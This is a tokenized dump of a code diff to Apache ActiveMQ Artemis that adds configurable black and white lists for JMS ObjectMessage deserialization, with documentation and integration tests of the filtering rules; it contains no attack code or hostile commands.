"law", "or", "agreed", "to", "in", "writing", ",", "software", "*", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "*", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "*", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "*", "limitations", "under", "the", "License", ".", "*", "/", "package", "org", ".", "apache", ".", "activemq", ".", "artemis", ".", "jms", ".", "client", ";", "/", "**", "Common", "interface", "to", "be", "used", "to", "share", "common", "parameters", "between", "the", "RA", "and", "client", "JMS", ".", "*", "Initially", "developed", "to", "carry", "on", "Serialization", "packages", "white", "list", "but", "it", "could", "eventually", "be", "expanded", ".", "*", "/", "public", "interface", "ConnectionFactoryOptions", "{", "String", "getDeserializationBlackList", "(", ");", "void", "setDeserializationBlackList", "(", "String", "blackList", ")", ";", "String", "getDeserializationWhiteList", "(", ");", "void", "setDeserializationWhiteList", "(", "String", "whiteList", ")", ";", "}", "@", "@", "-", "28", ",", "6", "+", "28", ",", "7", "@", "@", "private", "final", "ConnectionFactoryOptions", "options", ";", "protected", "JMSMessageListenerWrapper", "(", "final", "ConnectionFactoryOptions", "options", ",", "final", "ActiveMQConnection", "connection", ",", "this", ".", "options", "=", "options", ";", "ActiveMQMessage", "msg", "=", "ActiveMQMessage", ".", "createMessage", "(", "message", ",", "session", ".", "getCoreSession", "(", "),", "options", ")", ";", "String", "getDeserializationBlackList", "(", ");", "void", "setDeserializationBlackList", "(", "String", "blackList", ")", ";", "String", "getDeserializationWhiteList", "(", ");", "void", "setDeserializationWhiteList", "(", "String", "whiteList", ")", ";", "private", "String", "deserializationBlackList", ";", "private", "String", "deserializationWhiteList", ";", "deserializationBlackList", "=", "BufferHelper", ".", "readNullableSimpleStringAsString", "(", "buffer", ")", ";", "deserializationWhiteList", "=", "BufferHelper", ".", "readNullableSimpleStringAsString", "(", "buffer", ")", ";", "BufferHelper", ".", "writeAsNullableSimpleString", "(", "buffer", ",", "deserializationBlackList", ")", ";", "BufferHelper", ".", "writeAsNullableSimpleString", "(", "buffer", ",", "deserializationWhiteList", ")", ";", "BufferHelper", ".", "sizeOfNullableSimpleString", "(", "protocolManagerFactoryStr", ")", "BufferHelper", ".", "sizeOfNullableSimpleString", "(", "deserializationBlackList", ")", "BufferHelper", ".", "sizeOfNullableSimpleString", "(", "deserializationWhiteList", ")", ";", "@", "Override", "public", "String", "getDeserializationBlackList", "(", ")", "{", "return", "deserializationBlackList", ";", "}", "@", "Override", "public", "void", "setDeserializationBlackList", "(", "String", "blackList", ")", "{", "this", ".", "deserializationBlackList", "=", "blackList", ";", "}", "@", "Override", "public", "String", "getDeserializationWhiteList", "(", ")", "{", "return", "this", ".", "deserializationWhiteList", ";", "}", "@", "Override", "public", "void", "setDeserializationWhiteList", "(", "String", "whiteList", ")", "{", "this", ".", "deserializationWhiteList", "=", "whiteList", ";", "}", "public", "String", "getDeserializationBlackList", "(", ")", "{", "if", "(", "ActiveMQResourceAdapter", ".", "trace", ")", "{", "ActiveMQRALogger", ".", "LOGGER", ".", "trace", "(", "\"", "getDeserializationBlackList", "(", ")\"", ");", "}", "return", "raProperties", ".", "getDeserializationBlackList", "(", ");", "}", "public", "void", "setDeserializationBlackList", "(", "String", "deserializationBlackList", ")", "{", "if", "(", "ActiveMQResourceAdapter", ".", "trace", ")", "{", "ActiveMQRALogger", ".", "LOGGER", ".", "trace", "(", "\"", "setDeserializationBlackList", "(", "\"", "+", "deserializationBlackList", "+", "\"", ")\"", ");", "}", "raProperties", ".", "setDeserializationBlackList", "(", "deserializationBlackList", ")", ";", "}", "public", "String", "getDeserializationWhiteList", "(", ")", "{", "if", "(", "ActiveMQResourceAdapter", ".", "trace", ")", "{", "ActiveMQRALogger", ".", "LOGGER", ".", "trace", "(", "\"", "getDeserializationWhiteList", "(", ")\"", ");", "}", "return", "raProperties", ".", "getDeserializationWhiteList", "(", ");", "}", "public", "void", "setDeserializationWhiteList", "(", "String", "deserializationWhiteList", ")", "{", "if", "(", "ActiveMQResourceAdapter", ".", "trace", ")", "{", "ActiveMQRALogger", ".", "LOGGER", ".", "trace", "(", "\"", "setDeserializationWhiteList", "(", "\"", "+", "deserializationWhiteList", "+", "\"", ")\"", ");", "}", "raProperties", ".", "setDeserializationWhiteList", "(", "deserializationWhiteList", ")", ";", "}", "val5", "=", "overrideProperties", ".", "getDeserializationBlackList", "(", ")", "!", "=", "null", "?", "overrideProperties", ".", "getDeserializationBlackList", "(", ")", ":", "raProperties", ".", "getDeserializationBlackList", "(", ");", "if", "(", "val5", "!", "=", "null", ")", "{", "cf", ".", "setDeserializationBlackList", "(", "val5", ")", ";", "}", "val5", "=", "overrideProperties", ".", "getDeserializationWhiteList", "(", ")", "!", "=", "null", "?", "overrideProperties", ".", "getDeserializationWhiteList", "(", ")", ":", "raProperties", ".", "getDeserializationWhiteList", "(", ");", "if", "(", "val5", "!", "=", "null", ")", "{", "cf", ".", "setDeserializationWhiteList", "(", "val5", ")", ";", "}", "import", "org", ".", "apache", ".", "activemq", ".", "artemis", ".", "jms", ".", "client", ".", "ConnectionFactoryOptions", ";", "public", "class", "ConnectionFactoryProperties", "implements", "ConnectionFactoryOptions", "{", "private", "String", "deserializationBlackList", ";", "private", "String", "deserializationWhiteList", ";", "@", "Override", "public", "String", "getDeserializationBlackList", "(", ")", "{", "return", "deserializationBlackList", ";", "}", "@", "Override", "public", "void", "setDeserializationBlackList", "(", "String", "deserializationBlackList", ")", "{", "this", ".", "deserializationBlackList", "=", "deserializationBlackList", ";", "hasBeenUpdated", "=", "true", ";", "}", "@", "Override", "public", "String", "getDeserializationWhiteList", "(", ")", "{", "return", "this", ".", "deserializationWhiteList", ";", "}", "@", "Override", "public", "void", "setDeserializationWhiteList", "(", "String", "deserializationWhiteList", ")", "{", "this", ".", "deserializationWhiteList", "=", "deserializationWhiteList", ";", "hasBeenUpdated", "=", "true", ";", "}", "if", "(", "deserializationBlackList", "=", "=", "null", ")", "{", "if", "(", "other", ".", "deserializationBlackList", "!", "=", "null", ")", "return", "false", ";", "}", "else", "if", "(", "!", "deserializationBlackList", ".", "equals", "(", "other", ".", "deserializationBlackList", ")", ")", "return", "false", ";", "if", "(", "deserializationWhiteList", "=", "=", "null", ")", "{", "if", "(", "other", ".", "deserializationWhiteList", "!", "=", "null", ")", "return", "false", ";", "}", "else", "if", "(", "!", "deserializationWhiteList", ".", "equals", "(", "other", ".", "deserializationWhiteList", ")", ")", "return", "false", ";", "result", "=", "prime", "*", "result", "+", "(", "(", "deserializationBlackList", "=", "=", "null", ")", "?", "0", ":", "deserializationBlackList", ".", "hashCode", "(", "))", ";", "result", "=", "prime", "*", "result", "+", "(", "(", "deserializationWhiteList", "=", "=", "null", ")", "?", "0", ":", "deserializationWhiteList", ".", "hashCode", "(", "))", ";", "ActiveMQMessageHandler", "handler", "=", "new", "ActiveMQMessageHandler", "(", "factory", ",", "this", ",", "ra", ".", "getTM", "(", "),", "(", "ClientSessionInternal", ")", "session", ",", "cf", ",", "i", ")", ";", "import", "org", ".", "apache", ".", "activemq", ".", "artemis", ".", "jms", ".", "client", ".", "ConnectionFactoryOptions", ";", "private", "final", "ConnectionFactoryOptions", "options", ";", "public", "ActiveMQMessageHandler", "(", "final", "ConnectionFactoryOptions", "options", ",", "final", "ActiveMQActivation", "activation", ",", "this", ".", "options", "=", "options", ";", "ActiveMQMessage", "msg", "=", "ActiveMQMessage", ".", "createMessage", "(", "message", ",", "session", ",", "options", ")", ";", "#", "#", "Controlling", "JMS", "ObjectMessage", "deserialization", "Artemis", "provides", "a", "simple", "class", "filtering", "mechanism", "with", "which", "a", "user", "can", "specify", "which", "packages", "are", "to", "be", "trusted", "and", "which", "are", "not", ".", "Objects", "whose", "classes", "are", "from", "trusted", "packages", "can", "be", "deserialized", "without", "problem", ",", "whereas", "those", "from", "'", "not", "trusted", "'", "packages", "will", "be", "denied", "deserialization", ".", "Artemis", "keeps", "a", "`", "black", "list", "`", "to", "keep", "track", "of", "packages", "that", "are", "not", "trusted", "and", "a", "`", "white", "list", "`", "for", "trusted", "packages", ".", "By", "default", "both", "lists", "are", "empty", ",", "meaning", "any", "serializable", "object", "is", "allowed", "to", "be", "deserialized", ".", "If", "an", "object", "whose", "class", "matches", "one", "of", "the", "packages", "in", "black", "list", ",", "it", "is", "not", "allowed", "to", "be", "deserialized", ".", "If", "it", "matches", "one", "in", "the", "white", "list", "the", "object", "can", "be", "deserialized", ".", "If", "a", "package", "appears", "in", "both", "black", "list", "and", "white", "list", ",", "the", "one", "in", "black", "list", "takes", "precedence", ".", "If", "a", "class", "neither", "matches", "with", "`", "black", "list", "`", "nor", "with", "the", "`", "white", "list", "`", ",", "the", "class", "deserialization", "will", "be", "denied", "unless", "the", "white", "list", "is", "empty", "(", "meaning", "the", "user", "doesn", "'", "t", "specify", "the", "white", "list", "at", "all", ")", ".", "A", "class", "is", "considered", "as", "a", "'", "match", "'", "if", "-", "its", "full", "name", "exactly", "matches", "one", "of", "the", "entries", "in", "the", "list", ".", "-", "its", "package", "matches", "one", "of", "the", "entries", "in", "the", "list", "or", "is", "a", "sub", "-", "package", "of", "one", "of", "the", "entries", ".", "For", "example", ",", "if", "a", "class", "full", "name", "is", "\"", "org", ".", "apache", ".", "pkg1", ".", "Class1", "\"", ",", "some", "matching", "entries", "could", "be", ":", "-", "`", "org", ".", "apache", ".", "pkg1", ".", "Class1", "`", "-", "exact", "match", ".", "-", "`", "org", ".", "apache", ".", "pkg1", "`", "-", "exact", "package", "match", ".", "-", "`", "org", ".", "apache", "`", "-", "-", "sub", "package", "match", ".", "A", "`", "*`", "means", "'", "match", "-", "all", "'", "in", "a", "black", "or", "white", "list", ".", "#", "##", "Specifying", "black", "list", "and", "white", "list", "via", "Connection", "Factories", "To", "specify", "the", "white", "and", "black", "lists", "one", "can", "append", "properties", "`", "deserializationBlackList", "`", "and", "`", "deserializationWhiteList", "`", "respectively", "to", "a", "Connection", "Factory", "'", "s", "url", "string", ".", "For", "example", ":", "ActiveMQConnectionFactory", "factory", "=", "new", "ActiveMQConnectionFactory", "(", "\"", "vm", ":", "//", "0", "?", "deserializationBlackList", "=", "org", ".", "apache", ".", "pkg1", ",", "org", ".", "some", ".", "pkg2", "\"", ");", "The", "above", "statement", "creates", "a", "factory", "that", "has", "a", "black", "list", "contains", "two", "forbidden", "packages", ",", "\"", "org", ".", "apache", ".", "pkg1", "\"", "and", "\"", "org", ".", "some", ".", "pkg2", "\"", ",", "separated", "by", "a", "comma", ".", "You", "can", "also", "set", "the", "values", "via", "ActiveMQConnectionFactory", "'", "s", "API", ":", "public", "void", "setDeserializationBlackList", "(", "String", "blackList", ")", ";", "public", "void", "setDeserializationWhiteList", "(", "String", "whiteList", ")", ";", "Again", "the", "parameters", "are", "comma", "separated", "list", "of", "package", "/", "class", "names", ".", "#", "##", "Specifying", "black", "list", "and", "white", "list", "via", "system", "properties", "There", "are", "two", "system", "properties", "available", "for", "specifying", "black", "list", "and", "white", "list", ":", "-", "`", "org", ".", "apache", ".", "activemq", ".", "artemis", ".", "jms", ".", "deserialization", ".", "whitelist", "`", "-", "comma", "separated", "list", "of", "entries", "for", "the", "white", "list", ".", "-", "`", "org", ".", "apache", ".", "activemq", ".", "artemis", ".", "jms", ".", "deserialization", ".", "blacklist", "`", "-", "comma", "separated", "list", "of", "entries", "for", "the", "black", "list", ".", "Once", "defined", ",", "all", "JMS", "object", "message", "deserialization", "in", "the", "VM", "is", "subject", "to", "checks", "against", "the", "two", "lists", ".", "However", "if", "you", "create", "a", "ConnectionFactory", "and", "set", "a", "new", "set", "of", "black", "/", "white", "lists", "on", "it", ",", "the", "new", "values", "will", "override", "the", "system", "properties", ".", "#", "##", "Specifying", "black", "list", "and", "white", "list", "for", "resource", "adapters", "Message", "beans", "using", "a", "JMS", "resource", "adapter", "to", "receive", "messages", "can", "also", "control", "their", "object", "deserialization", "via", "properly", "configuring", "relevant", "properties", "for", "their", "resource", "adapters", ".", "There", "are", "two", "properties", "that", "you", "can", "configure", "with", "connection", "factories", "in", "a", "resource", "adapter", ":", "-", "`", "deserializationBlackList", "`", "-", "comma", "separated", "values", "for", "black", "list", "-", "`", "deserializationWhiteList", "`", "-", "comma", "separated", "values", "for", "white", "list", "These", "properties", ",", "once", "specified", ",", "are", "eventually", "set", "on", "the", "corresponding", "internal", "factories", ".", "@", "@", "-", "16", ",", "22", "+", "16", ",", "34", "@", "@", "import", "org", ".", "apache", ".", "activemq", ".", "artemis", ".", "api", ".", "core", ".", "SimpleString", ";", "import", "org", ".", "apache", ".", "activemq", ".", "artemis", ".", "tests", ".", "integration", ".", "jms", ".", "serializables", ".", "TestClass1", ";", "import", "org", ".", "apache", ".", "activemq", ".", "artemis", ".", "utils", ".", "ObjectInputStreamWithClassLoader", ";", "import", "java", ".", "io", ".", "Serializable", ";", "import", "java", ".", "util", ".", "Hashtable", ";", "import", "javax", ".", "jms", ".", "MessageConsumer", ";", "import", "javax", ".", "jms", ".", "MessageProducer", ";", "import", "javax", ".", "jms", ".", "ObjectMessage", ";", "import", "javax", ".", "jms", ".", "Queue", ";", "import", "javax", ".", "jms", ".", "QueueBrowser", ";", "import", "javax", ".", "naming", ".", "Context", ";", "import", "javax", ".", "naming", ".", "InitialContext", ";", "@", "Test", "public", "void", "testDeserializationOptions", "(", ")", "throws", "Exception", "{", "testDeserializationOptions", "(", "false", ",", "false", ")", ";", "}", "@", "Test", "public", "void", "testDeserializationOptionsJndi", "(", ")", "throws", "Exception", "{", "testDeserializationOptions", "(", "true", ",", "false", ")", ";", "}", "@", "Test", "public", "void", "testDeserializationOptionsBrowser", "(", ")", "throws", "Exception", "{", "testDeserializationOptions", "(", "false", ",", "true", ")", ";", "}", "@", "Test", "public", "void", "testDeserializationOptionsJndiBrowser", "(", ")", "throws", "Exception", "{", "testDeserializationOptions", "(", "true", ",", "true", ")", ";", "}", "private", "void", "testDeserializationOptions", "(", "boolean", "useJndi", ",", "boolean", "useBrowser", ")", "throws", "Exception", "{", "String", "qname", "=", "\"", "SerialTestQueue", "\"", ";", "SimpleString", "qaddr", "=", "new", "SimpleString", "(", "\"", "jms", ".", "queue", ".", "\"", "+", "qname", ")", ";", "liveService", ".", "createQueue", "(", "qaddr", ",", "qaddr", ",", "null", ",", "true", ",", "false", ")", ";", "/", "/", "default", "ok", "String", "blackList", "=", "null", ";", "String", "whiteList", "=", "null", ";", "Object", "obj", "=", "receiveObjectMessage", "(", "blackList", ",", "whiteList", ",", "qname", ",", "new", "TestClass1", "(", "),", "useJndi", ",", "useBrowser", ")", ";", "assertTrue", "(", "\"", "Object", "is", "\"", "+", "obj", ",", "obj", "instanceof", "TestClass1", ")", ";", "/", "/", "not", "in", "the", "white", "list", "blackList", "=", "\"", "java", ".", "lang", "\"", ";", "whiteList", "=", "\"", "some", ".", "other", ".", "package1", "\"", ";", "obj", "=", "receiveObjectMessage", "(", "blackList", ",", "whiteList", ",", "qname", ",", "new", "TestClass1", "(", "),", "useJndi", ",", "useBrowser", ")", ";", "assertTrue", "(", "\"", "Object", "is", "\"", "+", "obj", ",", "obj", "instanceof", "JMSException", ")", ";", "/", "/", "but", "String", "always", "trusted", "obj", "=", "receiveObjectMessage", "(", "blackList", ",", "whiteList", ",", "qname", ",", "new", "String", "(", "\"", "hello", "\"", "),", "useJndi", ",", "useBrowser", ")", ";", "assertTrue", "(", "\"", "java", ".", "lang", ".", "String", "always", "trusted", "\"", ",", "\"", "hello", "\"", ".", "equals", "(", "obj", ")", ");", "/", "/", "in", "the", "blacklist", "blackList", "=", "\"", "org", ".", "apache", ".", "activemq", ".", "artemis", ".", "tests", ".", "integration", ".", "jms", ".", "serializables", "\"", ";", "whiteList", "=", "\"", "org", ".", "apache", ".", "activemq", ".", "artemis", ".", "tests", ".", "integration", ".", "jms", ".", "serializables", "\"", ";", "obj", "=", "receiveObjectMessage", "(", "blackList", ",", "whiteList", ",", "qname", ",", "new", "TestClass1", "(", "),", "useJndi", ",", "useBrowser", ")", ";", "assertTrue", "(", "\"", "Object", "is", "\"", "+", "obj", ",", "obj", "instanceof", "JMSException", ")", ";", "/", "/", "black", "list", "parent", "package", "blackList", "=", "\"", "org", ".", "apache", ".", "activemq", ".", "artemis", "\"", ";", "whiteList", "=", "\"", "org", ".", "apache", ".", "activemq", ".", "artemis", ".", "tests", ".", "integration", ".", "jms", ".", "serializables", "\"", ";", "obj", "=", "receiveObjectMessage", "(", "blackList", ",", "whiteList", ",", "qname", ",", "new", "TestClass1", "(", "),", "useJndi", ",", "useBrowser", ")", ";", "assertTrue", "(", "\"", "Object", "is", "\"", "+", "obj", ",", "obj", "instanceof", "JMSException", ")", ";", "/", "/", "in", "white", "list", "blackList", "=", "\"", "some", ".", "other", ".", "package", "\"", ";", "whiteList", "=", "\"", "org", ".", "apache", ".", "activemq", ".", "artemis", ".", "tests", ".", "integration", ".", "jms", ".", "serializables", "\"", ";", "obj", "=", "receiveObjectMessage", "(", "blackList", ",", "whiteList", ",", "qname", ",", "new", "TestClass1", "(", "),", "useJndi", ",", "useBrowser", ")", ";", "assertTrue", "(", "\"", "Object", "is", "\"", "+", "obj", ",", "obj", "instanceof", "TestClass1", ")", ";", "/", "/", "parent", "in", "white", "list", "blackList", "=", "\"", "some", ".", "other", ".", "package", "\"", ";", "whiteList", "=", "\"", "org", ".", "apache", ".", "activemq", ".", "artemis", ".", "tests", ".", "integration", ".", "jms", "\"", ";", "obj", "=", "receiveObjectMessage", "(", "blackList", ",", "whiteList", ",", "qname", ",", "new", "TestClass1", "(", "),", "useJndi", ",", "useBrowser", ")", ";", "assertTrue", "(", "\"", "Object", "is", "\"", "+", "obj", ",", "obj", "instanceof", "TestClass1", ")", ";", "/", "/", "sub", "package", "in", "white", "list", "blackList", "=", "\"", "some", ".", "other", ".", "package", "\"", ";", "whiteList", "=", "\"", "org", ".", "apache", ".", "activemq", ".", "artemis", ".", "tests", ".", "integration", ".", "jms", ".", "serializables", ".", "pkg1", "\"", ";", "obj", "=", "receiveObjectMessage", "(", "blackList", ",", "whiteList", ",", "qname", ",", "new", "TestClass1", "(", "),", "useJndi", ",", "useBrowser", ")", ";", "assertTrue", "(", "\"", "Object", "is", "\"", "+", "obj", ",", "obj", "instanceof", "JMSException", ")", ";", "/", "/", "wild", "card", "white", "list", "but", "black", "listed", "blackList", "=", "\"", "org", ".", "apache", ".", "activemq", ".", "artemis", ".", "tests", ".", "integration", ".", "jms", ".", "serializables", "\"", ";", "whiteList", "=", "\"", "*\"", ";", "obj", "=", "receiveObjectMessage", "(", "blackList", ",", "whiteList", ",", "qname", ",", "new", "TestClass1", "(", "),", "useJndi", ",", "useBrowser", ")", ";", "assertTrue", "(", "\"", "Object", "is", "\"", "+", "obj", ",", "obj", "instanceof", "JMSException", ")", ";", "/", "/", "wild", "card", "white", "list", "and", "not", "black", "listed", "blackList", "=", "\"", "some", ".", "other", ".", "package", "\"", ";", "whiteList", "=", "\"", "*\"", ";", "obj", "=", "receiveObjectMessage", "(", "blackList", ",", "whiteList", ",", "qname", ",", "new", "TestClass1", "(", "),", "useJndi", ",", "useBrowser", ")", ";", "assertTrue", "(", "\"", "Object", "is", "\"", "+", "obj", ",", "obj", "instanceof", "TestClass1", ")", ";", "/", "/", "wild", "card", "black", "list", "blackList", "=", "\"", "*\"", ";", "whiteList", "=", "\"", "*\"", ";", "obj", "=", "receiveObjectMessage", "(", "blackList", ",", "whiteList", ",", "qname", ",", "new", "TestClass1", "(", "),", "useJndi", ",", "useBrowser", ")", ";", "assertTrue", "(", "\"", "Object", "is", "\"", "+", "obj", ",", "obj", "instanceof", "JMSException", ")", ";", "}", "@", "Test", "public", "void", "testSystemPropertyBlackWhiteListDefault", "(", ")", "throws", "Exception", "{", "System", ".", "setProperty", "(", "ObjectInputStreamWithClassLoader", ".", "BLACKLIST_PROPERTY", ",", "\"", "*\"", ");", "System", ".", "setProperty", "(", "ObjectInputStreamWithClassLoader", ".", "WHITELIST_PROPERTY", ",", "\"", "some", ".", "other", ".", "package", "\"", ");", "String", "qname", "=", "\"", "SerialTestQueue", "\"", ";", "SimpleString", "qaddr", "=", "new", "SimpleString", "(", "\"", "jms", ".", "queue", ".", "\"", "+", "qname", ")", ";", "liveService", ".", "createQueue", "(", "qaddr", ",", "qaddr", ",", "null", ",", "true", ",", "false", ")", ";", "try", "{", "String", "blackList", "=", "null", ";", "String", "whiteList", "=", "null", ";", "Object", "obj", "=", "receiveObjectMessage", "(", "blackList", ",", "whiteList", ",", "qname", ",", "new", "TestClass1", "(", "),", "false", ",", "false", ")", ";", "assertTrue", "(", "\"", "Object", "is", "\"", "+", "obj", ",", "obj", "instanceof", "JMSException", ")", ";", "/", "/", "but", "String", "always", "trusted", "obj", "=", "receiveObjectMessage", "(", "blackList", ",", "whiteList", ",", "qname", ",", "new", "String", "(", "\"", "hello", "\"", "),", "false", ",", "false", ")", ";", "assertTrue", "(", "\"", "java", ".", "lang", ".", "String", "always", "trusted", "\"", "+", "obj", ",", "\"", "hello", "\"", ".", "equals", "(", "obj", ")", ");", "/", "/", "override", "blackList", "=", "\"", "some", ".", "other", ".", "package", "\"", ";", "whiteList", "=", "\"", "org", ".", "apache", ".", "activemq", ".", "artemis", ".", "tests", ".", "integration", "\"", ";", "obj", "=", "receiveObjectMessage", "(", "blackList", ",", "whiteList", ",", "qname", ",", "new", "TestClass1", "(", "),", "false", ",", "false", ")", ";", "assertTrue", "(", "\"", "Object", "is", "\"", "+", "obj", ",", "obj", "instanceof", "TestClass1", ")", ";", "/", "/", "but", "String", "always", "trusted", "obj", "=", "receiveObjectMessage", "(", "blackList", ",", "whiteList", ",", "qname", ",", "new", "String", "(", "\"", "hello", "\"", "),", "false", ",", "false", ")", ";", "assertTrue", "(", "\"", "java", ".", "lang", ".", "String", "always", "trusted", "\"", "+", "obj", ",", "\"", "hello", "\"", ".", "equals", "(", "obj", ")", ");", "}", "finally", "{", "System", ".", "clearProperty", "(", "ObjectInputStreamWithClassLoader", ".", "BLACKLIST_PROPERTY", ")", ";", "System", ".", "clearProperty", "(", "ObjectInputStreamWithClassLoader", ".", "WHITELIST_PROPERTY", ")", ";", "}", "}", "private", "Object", "receiveObjectMessage", "(", "String", "blackList", ",", "String", "whiteList", ",", "String", "qname", ",", "Serializable", "obj", ",", "boolean", "useJndi", ",", "boolean", "useBrowser", ")", "throws", "Exception", "{", "sendObjectMessage", "(", "qname", ",", "obj", ")", ";", "StringBuilder", "query", "=", "new", "StringBuilder", "(", "\"\"", ");", "if", "(", "blackList", "!", "=", "null", ")", "{", "query", ".", "append", "(", "\"?", "\")", ";", "query", ".", "append", "(", "\"", "deserializationBlackList", "=", "\")", ";", "query", ".", "append", "(", "blackList", ")", ";", "if", "(", "whiteList", "!", "=", "null", ")", "{", "query", ".", "append", "(", "\"&", "\")", ";", "query", ".", "append", "(", "\"", "deserializationWhiteList", "=", "\")", ";", "query", ".", "append", "(", "whiteList", ")", ";", "}", "}", "else", "{", "if", "(", "whiteList", "!", "=", "null", ")", "{", "query", ".", "append", "(", "\"?", "deserializationWhiteList", "=", "\")", ";", "query", ".", "append", "(", "whiteList", ")", ";", "}", "}", "System", ".", "out", ".", "println", "(", "\"", "query", "string", ":", "\"", "+", "query", ")", ";", "ActiveMQConnectionFactory", "factory", "=", "null", ";", "if", "(", "useJndi", ")", "{", "Hashtable", "<", "String", ",", "Object", ">", "props", "=", "new", "Hashtable", "<", ">(", ");", "props", ".", "put", "(", "Context", ".", "INITIAL_CONTEXT_FACTORY", ",", "\"", "org", ".", "apache", ".", "activemq", ".", "artemis", ".", "jndi", ".", "ActiveMQInitialContextFactory", "\"", ");", "props", ".", "put", "(", "\"", "connectionFactory", ".", "VmConnectionFactory", "\"", ",", "\"", "vm", ":", "//", "0", "\"", "+", "query", ")", ";", "Context", "ctx", "=", "new", "InitialContext", "(", "props", ")", ";", "factory", "=", "(", "ActiveMQConnectionFactory", ")", "ctx", ".", "lookup", "(", "\"", "VmConnectionFactory", "\"", ");", "}", "else", "{", "factory", "=", "new", "ActiveMQConnectionFactory", "(", "\"", "vm", ":", "//", "0", "\"", "+", "query", ")", ";", "}", "Connection", "connection", "=", "null", ";", "try", "{", "connection", "=", "factory", ".", "createConnection", "(", ");", "connection", ".", "start", "(", ");", "Session", "session", "=", "connection", ".", "createSession", "(", "false", ",", "Session", ".", "AUTO_ACKNOWLEDGE", ")", ";", "Queue", "queue", "=", "session", ".", "createQueue", "(", "qname", ")", ";", "Object", "result", "=", "null", ";", "if", "(", "useBrowser", ")", "{", "QueueBrowser", "browser", "=", "session", ".", "createBrowser", "(", "queue", ")", ";", "ObjectMessage", "objMessage", "=", "(", "ObjectMessage", ")", "browser", ".", "getEnumeration", "(", ").", "nextElement", "(", ");", "/", "/", "drain", "message", "before", "triggering", "deserialization", "MessageConsumer", "consumer", "=", "session", ".", "createConsumer", "(", "queue", ")", ";", "consumer", ".", "receive", "(", "5000", ")", ";", "result", "=", "objMessage", ".", "getObject", "(", ");", "}", "else", "{", "MessageConsumer", "consumer", "=", "session", ".", "createConsumer", "(", "queue", ")", ";", "ObjectMessage", "objMessage", "=", "(", "ObjectMessage", ")", "consumer", ".", "receive", "(", "5000", ")", ";", "assertNotNull", "(", "objMessage", ")", ";", "result", "=", "objMessage", ".", "getObject", "(", ");", "}", "return", "result", ";", "}", "catch", "(", "Exception", "e", ")", "{", "return", "e", ";", "}", "finally", "{", "if", "(", "connection", "!", "=", "null", ")", "{", "try", "{", "connection", ".", "close", "(", ");", "}", "catch", "(", "JMSException", "e", ")", "{", "return", "e", ";", "}", "}", "}", "}", "private", "void", "sendObjectMessage", "(", "String", "qname", ",", "Serializable", "obj", ")", "throws", "Exception", "{", "ActiveMQConnectionFactory", "factory", "=", "new", "ActiveMQConnectionFactory", "(", "\"", "vm", ":", "//", "0", "\"", ");", "Connection", "connection", "=", "factory", ".", "createConnection", "(", ");", "try", "{", "Session", "session", "=", "connection", ".", "createSession", "(", "false", ",", "Session", ".", "AUTO_ACKNOWLEDGE", ")", ";", "Queue", "q", "=", "session", ".", "createQueue", "(", "qname", ")", ";", "MessageProducer", "producer", "=", "session", ".", "createProducer", "(", "q", ")", ";", "ObjectMessage", "objMessage", "=", "session", ".", "createObjectMessage", "(", ");", "objMessage", ".", "setObject", "(", "obj", ")", ";", "producer", ".", "send", "(", "objMessage", ")", ";", "}", "finally", "{", "connection", ".", "close", "(", ");", "}", "}", "/", "*", "*", "Licensed", "to", "the", "Apache", "Software", "Foundation", "(", "ASF", ")", "under", "one", "or", "more", "*", "contributor", "license", "agreements", ".", "See", "the", "NOTICE", "file", "distributed", "with", "*", "this", "work", "for", "additional", "information", "regarding", "copyright", "ownership", ".", "*", "The", "ASF", "licenses", "this", "file", "to", "You", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "*", "(", "the", "\"", "License", "\"", ");", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "*", "the", "License", ".", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "*", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "*", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "*", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "*", "limitations", "under", "the", "License", ".", "*", "/", "package", "org", ".", "apache", ".", "activemq", ".", "artemis", ".", "tests", ".", "integration", ".", "jms", ".", "serializables", ";", "import", "java", ".", "io", ".", "Serializable", ";", "public", "class", "TestClass1", "implements", "Serializable", "{", "}", "@", "@", "-", "26", ",", "15", "+", "26", ",", "23", "@", "@", "import", "org", ".", "apache", ".", "activemq", ".", "artemis", ".", "jms", ".", "client", ".", "ActiveMQConnectionFactory", ";", "import", "javax", ".", "jms", ".", "Connection", ";", "import", "javax", ".", "jms", ".", "JMSException", ";", "import", "javax", ".", "jms", ".", "MessageProducer", ";", "import", "javax", ".", "jms", ".", "ObjectMessage", ";", "import", "javax", ".", "jms", ".", "Queue", ";", "import", "javax", ".", "jms", ".", "Session", ";", "import", "java", ".", "io", ".", "Serializable", ";", "@", "Test", "public", "void", "testObjectMessageReceiveSerializationControl", "(", ")", "throws", "Exception", "{", "String", "blackList", "=", "\"", "org", ".", "apache", ".", "activemq", ".", "artemis", ".", "tests", ".", "integration", ".", "ra", "\"", ";", "String", "whiteList", "=", "\"", "*\"", ";", "testDeserialization", "(", "blackList", ",", "whiteList", ",", "false", ")", ";", "}", "@", "Test", "public", "void", "testObjectMessageReceiveSerializationControl1", "(", ")", "throws", "Exception", "{", "String", "blackList", "=", "\"", "some", ".", "other", ".", "pkg", "\"", ";", "String", "whiteList", "=", "\"", "org", ".", "apache", ".", "activemq", ".", "artemis", ".", "tests", ".", "integration", ".", "ra", "\"", ";", "testDeserialization", "(", "blackList", ",", "whiteList", ",", "true", ")", ";", "}", "@", "Test", "public", "void", "testObjectMessageReceiveSerializationControl2", "(", ")", "throws", "Exception", "{", "String", "blackList", "=", "\"", "*\"", ";", "String", "whiteList", "=", "\"", "org", ".", "apache", ".", "activemq", ".", "artemis", ".", "tests", ".", "integration", ".", "ra", "\"", ";", "testDeserialization", "(", "blackList", ",", "whiteList", ",", "false", ")", ";", "}", "@", "Test", "public", "void", "testObjectMessageReceiveSerializationControl3", "(", ")", "throws", "Exception", 